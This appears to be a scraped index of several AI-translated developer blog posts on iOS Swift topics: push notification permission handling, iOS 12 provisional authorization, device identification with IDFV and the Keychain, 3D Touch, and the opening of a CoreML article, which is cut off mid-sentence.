ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Handling Push Notification Permission Status from iOS 9 to iOS 12 (Swift)Solut...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Handling Push Notification Permission Status from iOS 9 to iOS 12 (Swift)Solution for Handling Notification Permission Status and Requesting Permission on iOS 9 to iOS 12What to do?Continuing from the previous article ‚ÄúWhat? iOS 12 Can Send Push Notifications Without User Authorization (Swift)‚Äù about optimizing the push notification permission process, after the optimization in the previous Murmur section, a new requirement has arisen: If the user disables notifications, we can prompt them to enable it on specific feature pages. After navigating to the settings page, if the notification is turned on or off, returning to the app should reflect the updated status. If push notification permission has not been requested, ask for permission.If permission was requested but denied, show a prompt.If permission was requested and granted, proceed with the operation. Support from iOS 9 to iOS 12 is required 1 to 3 are fine. Using the UserNotifications framework introduced in iOS 10 can handle most cases properly. The tricky part is item 4, which needs to support iOS 9. For iOS 9, you have to use the old method registerUserNotificationSettings, which is not easy to handle. Let‚Äôs take it step by step!Approach and Structure:First, declare a global notificationStatus object to store the notification permission status. Add property observation on the pages where handling is needed (here I use Observable to subscribe to property changes; you can choose suitable KVO or use Rx, ReactiveCocoa).Handle checking the push notification permission status and update the notificationStatus value in appDelegate methods: didFinishLaunchingWithOptions (when the app initially opens), applicationDidBecomeActive (when returning from background), and didRegisterUserNotificationSettings (for push notification permission handling in ‚â§iOS 9).Pages that require handling will be triggered to perform corresponding actions (e.g., showing a prompt if notifications are disabled).1. First, declare the global notificationStatus objectenum NotificationStatusType { case authorized case denied case notDetermined}var notificationStatus: Observable&lt;NotificationStatusType?&gt; = Observable(nil)The four states of notificationStatus/NotificationStatusType correspond to: nil = Object initialization‚Ä¶ detecting‚Ä¶ notDetermined = User has not been asked whether to receive notifications authorized = User has been asked whether to receive notifications and pressed ‚ÄúAllow‚Äù denied = The user has been asked whether to receive notifications and selected ‚ÄúDon‚Äôt Allow‚Äù 2. Method to Check Notification Permission Status:func checkNotificationPermissionStatus() { if #available(iOS 10.0, *) { UNUserNotificationCenter.current().getNotificationSettings { (settings) in DispatchQueue.main.async { // Note! Switch back to the main thread if settings.authorizationStatus == .authorized { // Allowed notificationStatus.value = NotificationStatusType.authorized } else if settings.authorizationStatus == .denied { // Not allowed notificationStatus.value = NotificationStatusType.denied } else { // Not asked notificationStatus.value = NotificationStatusType.notDetermined } } } } else { if UIApplication.shared.currentUserNotificationSettings?.types == [] { if let iOS9NotificationIsDetermined = UserDefaults.standard.object(forKey: \"iOS9NotificationIsDetermined\") as? Bool,iOS9NotificationIsDetermined == true { // Not asked notificationStatus.value = NotificationStatusType.notDetermined } else { // Not allowed notificationStatus.value = NotificationStatusType.denied } } else { // Allowed notificationStatus.value = NotificationStatusType.authorized } }}It‚Äôs not over yet!Sharp-eyed readers might have noticed the custom UserDefaults ‚ÄúiOS9NotificationIsDetermined‚Äù in the ‚â§ iOS 9 check. So, what is it used for?The main reason is that the method for checking push notification permissions in iOS 9 and earlier can only determine the current permissions. If it returns empty, it means no permission, but it will also be empty if the user has never been asked. This causes a problem: has the user never been asked, or have they been asked and denied permission?Here, I used a custom UserDefaults key iOS9NotificationIsDetermined as a toggle, and added the following in appDelegate‚Äôs didRegisterUserNotificationSettings://appdelegate.swift:func application(_ application: UIApplication, didRegister notificationSettings: UIUserNotificationSettings) { // iOS 9 and below: This method is triggered after the permission prompt is shown and the user taps Allow or Don't Allow UserDefaults.standard.set(\"iOS9NotificationIsDetermined\", true) checkNotificationPermissionStatus()}After setting up the notification permission status object and detection method, we still need to add the following in appDelegate‚Ä¶//appdelegate.swiftfunc application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -&gt; Bool { checkNotificationPermissionStatus() return true}func applicationDidBecomeActive(_ application: UIApplication) { checkNotificationPermissionStatus()}How to recheck the push notification status when the app starts or returns from the background?That concludes the inspection part. Next, let‚Äôs see how to handle requests for notification permissions if not yet asked.3. Request Notification Permission:func requestNotificationPermission() { if #available(iOS 10.0, *) { let permissiones:UNAuthorizationOptions = [.badge, .alert, .sound] UNUserNotificationCenter.current().requestAuthorization(options: permissiones) { (granted, error) in DispatchQueue.main.async { checkNotificationPermissionStatus() } } } else { application.registerUserNotificationSettings(UIUserNotificationSettings(types: [.alert, .badge, .sound], categories: nil)) // The didRegisterUserNotificationSettings in appdelegate.swift will handle the subsequent callback }}All checks and requirements are completed. Let‚Äôs see how to apply them.4. Applications (Static)if notificationStatus.value == NotificationStatusType.authorized { //OK!} else if notificationStatus.value == NotificationStatusType.denied { //Not allowed //This example shows an UIAlertController prompt that, when tapped, navigates to the settings page let alertController = UIAlertController( title: \"Dear user, you cannot receive notifications currently\", message: \"Please enable notifications for the app.\", preferredStyle: .alert) let settingAction = UIAlertAction( title: \"Go to Settings\", style: .destructive, handler: { (action: UIAlertAction!) -&gt; Void in if let bundleID = Bundle.main.bundleIdentifier, let url = URL(string:UIApplicationOpenSettingsURLString + bundleID) { UIApplication.shared.openURL(url) } }) let okAction = UIAlertAction( title: \"Cancel\", style: .default, handler: { (action: UIAlertAction!) -&gt; Void in //well.... }) alertController.addAction(okAction) alertController.addAction(settingAction) self.present(alertController, animated: true) { }} else if notificationStatus.value == NotificationStatusType.notDetermined { //Not asked yet requestNotificationPermission()} Please note!! Do not use this when navigating to the app‚Äôs ‚ÄúSettings‚Äù page UIApplication.shared.openURL(URL(string:‚ÄùApp-Prefs:root=\\ (bundleID)‚Äù) ) Method redirects, will be rejected! will be rejected! will be rejected! (personal experience) This is a Private API5. Applications (Dynamic)For dynamically changing the status, since the notificationStatus object we use is Observable, we can add a listener in viewDidLoad where we need to monitor the status continuously:override func viewDidLoad() { super.viewDidLoad() notificationStatus.afterChange += { oldStatus,newStatus in if newStatus == NotificationStatusType.authorized { //print(\"‚ù§Ô∏èThank you for enabling notifications\") } else if newStatus == NotificationStatusType.denied { //print(\"üò≠Oh no\") } }} The above is just sample code; actual application and triggers can be adjusted as needed. *notificationStatus uses Observable. Please pay attention to memory management: release it when necessary (to prevent memory leaks) and retain it when needed (to avoid losing event listening).Complete Demo Product Attached:ÁµêÂ©öÂêßAPPSince our project supports iOS 9 to iOS 12, iOS 8 has not been tested and its support level is uncertainIf you have any questions or suggestions, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS 12 Provisional AuthorizationÔΩúReceive Silent Push Notifications Without User Permission", "url": "/posts/zrealm-dev/ios-12-provisional-authorization-receive-silent-push-notifications-without-user-permission-ade9e745a4bf/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, swift, push-notification, ios-app-development, ios-12", "date": "2018-11-01 23:35:02 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!What? iOS 12 Can Send Push Notifications Without User Permission (Swift) ‚Äî (Up...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!What? iOS 12 Can Send Push Notifications Without User Permission (Swift) ‚Äî (Updated 2019‚Äì02‚Äì06)UserNotifications Provisional Authorization Temporary Permission and iOS 12 Silent Notifications IntroductionMurMur‚Ä¶‚Ä¶Some time ago, I worked on improving the app‚Äôs push notification permission and click-through rates by making some optimizations. The initial version had a very poor experience: right after installing and launching the app, a prompt would immediately appear asking, ‚ÄúApp wants to send notifications.‚Äù Naturally, the denial rate was very high. Based on the previous article using Notification Service Extension to count actual notification displays, it is estimated that only about 10% of users allowed push notifications.Currently adjusting the new installation guide process and optimizing the interface by changing the timing of the notification pop-up as follows:Wedding AppIf users are still hesitant or want to try before deciding whether to receive notifications, they can tap ‚ÄúSkip‚Äù in the top right corner. This avoids pressing ‚ÄúDon‚Äôt Allow‚Äù initially due to unfamiliarity with the app, which would prevent future prompts permanently.Getting to the PointWhen working on the above optimization, I found that UserNotifications in iOS 12 added a .provisional permission. Simply put, it is a temporary notification permission that allows sending push notifications to users (silent notifications) without showing the permission prompt. Let‚Äôs look at its actual effects and limitations.How to Request Temporary Notification Permission?if #available(iOS 12.0, *) { let center = UNUserNotificationCenter.current() let permissions: UNAuthorizationOptions = [.badge, .alert, .sound, .provisional] // You can request only temporary permission .provisional, or request all needed permissions at once XD // Neither will trigger the notification permission prompt center.requestAuthorization(options: permissions) { (granted, error) in print(granted) }}We add the above code to AppDelegate‚Äôs didFinishLaunchingWithOptions, then launch the app, and notice that the notification permission prompt does not appear; at this point, we go to Settings to check App Notification Settings.(Figure 1) Obtain silent notification permissionWe quietly obtained the silent notification permission üèÜAdd the authorizationStatus .provisional item (iOS 12 and later only) in the code that checks the current push notification permission:if #available(iOS 10.0, *) { UNUserNotificationCenter.current().getNotificationSettings { (settings) in if settings.authorizationStatus == .authorized { // Allowed } else if settings.authorizationStatus == .denied { // Denied } else if settings.authorizationStatus == .notDetermined { // Not asked yet } else if #available(iOS 12.0, *) { if settings.authorizationStatus == .provisional { // Currently provisional permission } } }} Please note! If you are checking the current notification permission status, settings.authorizationStatus == .notDetermined and settings.authorizationStatus == .provisional They can all trigger a notification prompt asking the user whether they allow receiving notifications.What can silent notifications do? How do push notifications display?First, here is an image summarizing when silent notifications will appear:You can see that if it is a silent push notification, when the app receives the notification in the background state, no banner will appear, no sound alert will play, it cannot be marked, and it will not show on the lock screen; it will only appear in the Notification Center when the phone is unlocked and pulled down:You can see the push notifications you sent, which will automatically be grouped into a category.After clicking to expand, users can choose:This expanded inquiry window only appears under ‚Äútemporary permission‚Äù when silent push notifications are enabled. To ‚Äúcontinue‚Äù receiving push notifications ‚Äî ‚ÄúSend important notifications‚Äù: Notification permissions are fully enabled! Notification permissions are fully enabled! Notification permissions are fully enabled! This is really important, so it‚Äôs repeated three times. At this point, the earlier code requesting all permissions together becomes very effective.Or continue receiving silent notifications. ‚ÄúOff‚Äù ‚Äî Clicking ‚ÄúTurn off all notifications‚Äù completely disables push notifications (including silent notifications). Note: How to manually set an existing app to silent notifications?Silent notifications are a new setting introduced in iOS 12 to optimize notifications and are unrelated to temporary permissions. However, apps that have temporary permissions can send silent notifications. Setting an app‚Äôs notifications to silent is simple. One way is to go to ‚ÄúSettings‚Äù - ‚ÄúNotifications‚Äù - find the app, then turn off all permissions except ‚ÄúNotification Center‚Äù (as shown in Figure 1) to enable silent notifications.Alternatively, when receiving a notification from the app, press firmly/long press to expand it, then tap the ‚Äú‚Ä¶‚Äù in the top right corner and select ‚ÄúSend Silent Notification‚Äù:With temporary permissions when a prompt notification window is triggered later:Removing the notification permission request and just using .provisional will still prompt the user to allow notifications:if #available(iOS 10.0, *) { let center = UNUserNotificationCenter.current() let permissions: UNAuthorizationOptions = [.badge, .alert, .sound] center.requestAuthorization(options: permissions) { (granted, error) in print(granted) }}Tap ‚ÄúAllow‚Äù to grant all notification permissions, or tap ‚ÄúDon‚Äôt Allow‚Äù to disable all notification permissions (including previously granted silent notification permissions).The overall process is as follows:Summary:This thoughtful notification improvement in iOS 12 makes it easier for users and developers to build interactive bridges through notifications, helping to avoid situations where notifications are permanently turned off.For users, when the notification permission prompt appears, they often don‚Äôt know whether to allow or deny it because they don‚Äôt know what kind of notifications the developer will send. It could be ads or important messages. The unknown is scary, so most people tend to play it safe and press deny first.For developers, we carefully prepare many items, including important messages to push to users, but due to the issues mentioned above, users block them, wasting the effort we put into designing the content!This feature allows developers to seize the opportunity when users first install the app, design the push notification process and content, prioritize sending notifications about items users are interested in, increase users‚Äô awareness of the app‚Äôs notifications, track push notification click rates, and trigger prompts asking users if they want to receive notifications at the right time.Although the only place for exposure is the Notification Center, having exposure is still an opportunity; from another perspective, if we were users and didn‚Äôt allow notifications, an app sending many notifications with banners, sounds, and appearing on the lock screen would be very annoying (the competing side does this XD). Apple‚Äôs approach strikes a balance between users and developers.The current problem is that there are still too few iOS 12 users ü§êFurther Reading Handling Push Notification Permission Status from iOS 9 to iOS 12 (Swift) iOS Deferred Deep Link Implementation (Swift) iOS+MacOS Using mitmproxy for Man-in-the-Middle Sniffing iOS 15 / MacOS Monterey Safari will be able to hide real IP If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS UUID ExplainedÔΩúSwift Techniques for Unique Device Identification", "url": "/posts/zrealm-dev/ios-uuid-explained-swift-techniques-for-unique-device-identification-a4bc3bce7513/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, iplayground, swift, ios-app-development, uuid, idfv", "date": "2018-10-25 22:26:20 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!All About iOS UUID (Swift/iOS ‚â• 6)iPlayground 2018 Returns &amp; The Story of ...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!All About iOS UUID (Swift/iOS ‚â• 6)iPlayground 2018 Returns &amp; The Story of UUIDsPreface:Last Saturday and Sunday, I attended the iPlayground Apple software developer conference. A colleague passed the event information to me, and I wasn‚Äôt familiar with it before going.After two days, the entire event and schedule ran smoothly. The agenda included: Fun: Bicycles, Withering Code, iOS/API Evolution, Where‚Äôs Wally (CoreML Vision) Practical: Testing types (XCUITest, dependency injection), alternatives to SpriteKit for animation effects, GraphQL Kung Fu: In-Depth Analysis of Swift, iOS Jailbreak/Tweak Development, Redux Bicycle Project was impressive, using an iPhone as a sensor to detect pedal rotation. The presenter rode the bike on stage to switch slides (the main goal was to create an open-source version of Zwift, and they also shared many pitfalls, such as Client/Server communication, latency issues, and magnetic interference).Withering Dirty Code; it resonates deeply and brings a knowing smile; technical debt accumulates this way‚Äîrushed development leads to quick but poor architecture, and successors have no time to refactor, so it piles up more and more; in the end, sometimes the only option is to abandon that path entirely.Test Classes (Design Patterns in XCUITest) KKBOX Seniors openly share their methods, code examples, common pitfalls, and solutions without holding anything back. This session is one of the most helpful for our work. Testing is an area I have always wanted to improve, so I can go back and study it thoroughly.I really wanted to go on stage and share during the Lighting Talk session while listening from the audience üòÇ Next time, I need to prepare earlier!The official party after the event offered generous drinks, food, and venue. Listening to the honest stories from senior colleagues was not only relaxed and fun but also a great way to gain valuable workplace soft skills.NTU Backend CafeI just found out this is the first edition. I‚Äôm truly honored to participate. Thanks to all the staff and speakers for their hard work!The purpose of attending a seminar is essentially to: broaden your horizons by absorbing new knowledge, understanding the ecosystem, and encountering topics you don‚Äôt usually engage with, and deepen your expertise by reviewing familiar topics to see if you‚Äôve missed anything or discovered alternative approaches.I took many notes to review and study at my own pace later.All About UUIDsBecause I immediately applied it to the app after listening; this class was taught by senior Zonble. When I heard about development from iPhone OS 2 to iOS 12, I was amazed. Since I started late in the industry, I began coding from iOS 11/Swift 4, so I didn‚Äôt experience the chaotic period when Apple changed APIs.It‚Äôs quite reasonable that UUIDs can be blocked; if used properly, they help identify user devices, support advertising, or enable third parties to perform unique ad targeting. However, if a company has malicious intent, they can use this mechanism to backtrack and learn about the phone owner. For example, if you have travel apps, Taipei bus apps, BMW apps, and baby care apps installed, they can infer that you often travel abroad, have children, and live in Taipei. Combined with personal data you enter in apps, the potential misuse is unimaginable.But this also affected many legitimate users. For example, those who used UUID as the data decryption key for users or as a device identifier were greatly impacted. I really admire the engineers from that time‚Äîthey had to quickly come up with alternative solutions while dealing with furious bosses and users.Alternative solutions:This article focuses on obtaining the UUID to identify a device uniquely. If you want alternatives to find out which apps a user has installed, you can refer to the following keyword search methods: UIPasteboard pasteboardWithName: create: (using the clipboard to share data between apps), canOpenURL:, info.plist LSApplicationQueriesSchemes (using canOpenURL to check if an app is installed, must be listed in info.plist, up to 50 entries). Using MAC Address as UUID, but later got banned Finger Printing (Canvas/User-Agent‚Ä¶): Not researched, but mainly used to generate the same UUID for Safari and the app, used for Deferred Deep LinkingAmIUnique? IDentifier For Vendor (IDFV): The current mainstream solution üèÜThe concept is that Apple generates a UUID for the user based on the Bundle ID prefix. Apps with the same Bundle ID prefix will get the same UUID on the same device. For example: com.518.work / com.518.job will receive the same UUID on the same device.As the original term ‚ÄúID For Vendor‚Äù suggests, Apple treats apps with the same prefix as from the same vendor, so sharing the UUID is allowed. IDentifier For Vendor (IDFV):let DEVICE_UUID:String = UIDevice.current.identifierForVendor?.uuidString ?? UUID().uuidStringNote: When all apps from the same vendor are removed and then reinstalled, a new UUID will be generated ( if both com.518.work and com.518.job are deleted, reinstalling com.518.work will generate a new UUID )Similarly, if you have only one app, deleting and reinstalling it will generate a new UUIDBecause of this feature, our company‚Äôs other apps use Key-Chain to solve this problem. After listening to the senior speaker‚Äôs advice, we confirmed that this approach is correct!Process as follows:When the Key-Chain UUID field has a value, use it; otherwise, take the IDFA UUID value and write it back.Key-Chain Writing Method:if let data = DEVICE_UUID.data(using: .utf8) { let query = [ kSecClass as String : kSecClassGenericPassword as String, kSecAttrAccount as String : \"DEVICE_UUID\", kSecValueData as String : data ] as [String : Any] SecItemDelete(query as CFDictionary) // Delete existing item SecItemAdd(query as CFDictionary, nil) // Add new item}Key-Chain Reading Method:let query = [ kSecClass as String : kSecClassGenericPassword, kSecAttrAccount as String : \"DEVICE_UUID\", kSecReturnData as String : kCFBooleanTrue, kSecMatchLimit as String : kSecMatchLimitOne ] as [String : Any]var dataTypeRef: AnyObject? = nillet status: OSStatus = SecItemCopyMatching(query as CFDictionary, &amp;dataTypeRef)if status == noErr,let dataTypeRef = dataTypeRef as? Data,let uuid = String(data:dataTypeRef, encoding: .utf8) { //uuid} If you find Key-Chain operations too cumbersome, you can encapsulate them yourself or use third-party libraries.Complete CODE:let DEVICE_UUID:String = { let query = [ kSecClass as String : kSecClassGenericPassword, kSecAttrAccount as String : \"DEVICE_UUID\", kSecReturnData as String : kCFBooleanTrue, kSecMatchLimit as String : kSecMatchLimitOne ] as [String : Any] var dataTypeRef: AnyObject? = nil let status: OSStatus = SecItemCopyMatching(query as CFDictionary, &amp;dataTypeRef) if status == noErr,let dataTypeRef = dataTypeRef as? Data,let uuid = String(data:dataTypeRef, encoding: .utf8) { return uuid } else { let DEVICE_UUID:String = UIDevice.current.identifierForVendor?.uuidString ?? UUID().uuidString if let data = DEVICE_UUID.data(using: .utf8) { let query = [ kSecClass as String : kSecClassGenericPassword as String, kSecAttrAccount as String : \"DEVICE_UUID\", kSecValueData as String : data ] as [String : Any] SecItemDelete(query as CFDictionary) SecItemAdd(query as CFDictionary, nil) } return DEVICE_UUID }}()Because I need to reference it in other Extension Targets as well, I directly wrapped it as a closure parameter for use.If you have any questions or suggestions, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Boost iOS App UXÔΩúImplement 3D Touch with Swift for Instant Interaction", "url": "/posts/zrealm-dev/boost-ios-app-ux-implement-3d-touch-with-swift-for-instant-interaction-1ca246e27273/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, swift, 3d-touch, iphone, ios-app-development", "date": "2018-10-18 22:36:57 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Deprecated] Enhance User Experience by Adding 3D TOUCH to Your iOS APP Now (S...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Deprecated] Enhance User Experience by Adding 3D TOUCH to Your iOS APP Now (Swift)iOS 3D TOUCH Applications[Deprecated] 2020/06/14 iPhone 11 and later models have removed the 3D Touch feature; it has been replaced by Haptic Touch, which works differently.Recently, during some downtime in project development, I explored many interesting iOS features: CoreML, Vision, Notification Service Extension, Notification Content Extension, Today Extension, Core Spotlight, Share Extension, SiriKit (some have been organized into articles, more to come ü§£)Among them is today‚Äôs highlight: 3D Touch featureThis feature, supported since iOS 9/iPhone 7, only became truly useful to me after I upgraded from an iPhone 6 to an iPhone 8!3D Touch can implement two features in the APP, as follows: Preview ViewController Preview Feature ‚Äî ÁµêÂ©öÂêßAPP 3D Touch Shortcut APP Launch FeatureThe first item is the most widely used and effective (Facebook: News Feed content preview, Line: message sneak peek). The second item, app shortcut launch, currently shows low usage based on data, so it is discussed last.1. Preview ViewController Preview Feature:The feature demonstration is shown in Figure 1 above. The ViewController preview function is supported. 3D Touch Press: Background Blur Effect 3D Touch Press and Hold to Pop Up ViewController Preview Window 3D Touch press triggers a ViewController preview window, swiping up reveals an options menu below. 3D Touch Press and Release to Return to Window 3D Touch: Press Harder to Enter the Target ViewController Here, the code to be implemented is listed separately for A: List Window and B: Target Window:Since there is no way to determine whether the current state is preview or actual entry into this window in B, we first create a Protocol to pass values for judgment.protocol UIViewControllerPreviewable { var is3DTouchPreview: Bool { get set }}This way, we can make the following judgment in B:class BViewController:UIViewController, UIViewControllerPreviewable { var is3DTouchPreview:Bool = false override func viewDidLoad() { super.viewDidLoad() if is3DTouchPreview { // If this is a preview window... for example: go full screen, hide toolbar } else { // Display normally in full mode } }A: List view, which can be a UITableView or UICollectionView:class AViewController:UIViewController { // Register views that support 3D Touch override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) { super.traitCollectionDidChange(previousTraitCollection) if traitCollection.forceTouchCapability == .available { //TableView: registerForPreviewing(with: self, sourceView: self.TableView) //CollectionView: registerForPreviewing(with: self, sourceView: self.CollectionView) } } }extension AViewController: UIViewControllerPreviewingDelegate { // Action after 3D Touch is released func previewingContext(_ previewingContext: UIViewControllerPreviewing, commit viewControllerToCommit: UIViewController) { // Now directly push the page, so disable preview mode on the ViewController: if var viewControllerToCommit = viewControllerToCommit as? UIViewControllerPreviewable { viewControllerToCommit.is3DTouchPreview = false } self.navigationController?.pushViewController(viewControllerToCommit, animated: true) } // Control the 3D Touch cell location and the ViewController to show func previewingContext(_ previewingContext: UIViewControllerPreviewing, viewControllerForLocation location: CGPoint) -&gt; UIViewController? { // Get current indexPath/cell at the touch point //TableView: guard let indexPath = TableView.indexPathForRow(at: location),let cell = TableView.cellForRow(at: indexPath) else { return nil } //CollectionView: guard let indexPath = CollectionView.indexPathForItem(at: location),let cell = CollectionView.cellForItem(at: indexPath) else { return nil } // ViewController to display let targetViewController = UIStoryboard(name: \"StoryboardName\", bundle: nil).instantiateViewController(withIdentifier: \"ViewControllerIdentifier\") // Area to keep clear during background blur (usually the touch area), see image 1 previewingContext.sourceRect = cell.frame // 3D Touch window size, default is adaptive and usually no change needed // To modify, use: targetViewController.preferredContentSize = CGSize(width: 0.0, height: 0.0) // Inform the preview ViewController that it is in preview mode: if var targetViewController = targetViewController as? UIViewControllerPreviewable { targetViewController.is3DTouchPreview = true } // Return nil to disable any action return nil }} Note! The registration for the 3D Touch enabled View must be placed inside traitCollectionDidChange, not in ‚ÄúviewDidLoad‚Äù ( please refer to this article ) Regarding where to add it, I encountered many pitfalls. Some online sources suggest placing it in viewDidLoad, while others recommend cellForItem, but both locations sometimes cause occasional failures or partial cell failures.Figure 1 Background Blur Retention Area DiagramIf you need to add an options menu at the bottom after scrolling up, please add it inside B. It‚Äôs B, it‚Äôs B, it‚Äôs B!override var previewActionItems: [UIPreviewActionItem] { let profileAction = UIPreviewAction(title: \"View Business Info\", style: .default) { (action, viewController) -&gt; Void in // Action after tapping } return [profileAction]}Return an empty array to indicate that this feature is not used.Done!2. APP Shortcut LaunchStep OneAdd the UIApplicationShortcutItems key in info.plist, type ArrayAdd a menu item (Dictionary), with the Key-Value pairs set as follows: [Required] UIApplicationShortcutItemType: Identifier string used for decision-making in AppDelegate [Required] UIApplicationShortcutItemTitle: Option Title UIApplicationShortcutItemSubtitle: Option subtitle UIApplicationShortcutItemIconType : Use system iconsReference from this article UIApplicationShortcutItemIconFile: Use a custom icon (size: 35x35, monochrome), choose either this or UIApplicationShortcutItemIconType UIApplicationShortcutItemUserInfo: Additional information EX: [id:1] My settings are as shown in the above image.Step TwoAdd a handling function in AppDelegatefunc application(_ application: UIApplication, performActionFor shortcutItem: UIApplicationShortcutItem, completionHandler: @escaping (Bool) -&gt; Void) { var info = shortcutItem.userInfo switch shortcutItem.type { case \"searchShop\": // Handle search shop action case \"topicList\": // Handle topic list action case \"likeWorksPic\": // Handle like works picture action case \"marrybarList\": // Handle marry bar list action default: break } completionHandler(true)}Done!ConclusionAdding 3D Touch functionality in an app is not difficult and users will find it thoughtful ‚ù§; it can be combined with design operations to enhance user experience. However, currently only the two functions mentioned above can be implemented, and since iPhone 6s and below, iPad, and iPhone XR do not support 3D Touch, the actual usable features are even fewer, mainly serving as an aid to enhance experience.p.s.If you test carefully, you‚Äôll notice the above effect occurs when some images in the CollectionView have already scrolled out of view and you press on them. üòÖIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "CoreML 2.0ÔΩúAutomate Article Classification with Custom-Trained Machine Learning Models", "url": "/posts/zrealm-dev/coreml-2-0-automate-article-classification-with-custom-trained-machine-learning-models-793bf2cdda0f/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, swift, ios, machine-learning, natural-language-processing, ios-app-development", "date": "2018-10-17 23:20:35 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Experience iOS 12 CoreML ‚Äî Use Machine Learning to Automatically Predict Artic...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Experience iOS 12 CoreML ‚Äî Use Machine Learning to Automatically Predict Article Categories, and Train the Model Yourself!Exploring CoreML 2.0: How to Convert or Train Models and Apply Them in Real ProductsContinuing from the previous article on using machine learning on iOS, this article officially begins with using CoreML.First, a brief history: Apple released the CoreML machine learning framework (including Vision introduced in the previous article) in 2017. In 2018, they followed up with CoreML 2.0, which not only improved performance but also supported custom CoreML models.PrefaceIf you have only heard the term ‚Äúmachine learning‚Äù but don‚Äôt know what it means, here is a simple explanation in one sentence: ‚ÄúPredicting the outcome of the same event based on your past experience‚Äù For example: When I eat an egg pancake, I add ketchup. After buying it a few times, the breakfast shop owner remembers and asks, ‚ÄúHandsome, ketchup?‚Äù I answer, ‚ÄúYes‚Äù ‚Äî the owner predicts correctly. If I answer, ‚ÄúNo, because it‚Äôs radish cake + egg pancake‚Äù ‚Äî the owner remembers and corrects the question the next time the same situation occurs. Input data: egg pancake, cheese egg pancake, egg pancake + radish cake, radish cake, egg Output data: Add ketchup / Do not add ketchup Model: The Landlady‚Äôs Memory and JudgmentActually, my understanding of machine learning is mostly limited to knowing the basic concepts and theories, but I haven‚Äôt studied it in depth. Please kindly correct me if there are any mistakes.Speaking of which, I have to pay tribute üõê to the Apple gods for productizing machine learning. As long as you know the basic concepts, you can operate it without a vast knowledge base, lowering the entry barrier. I 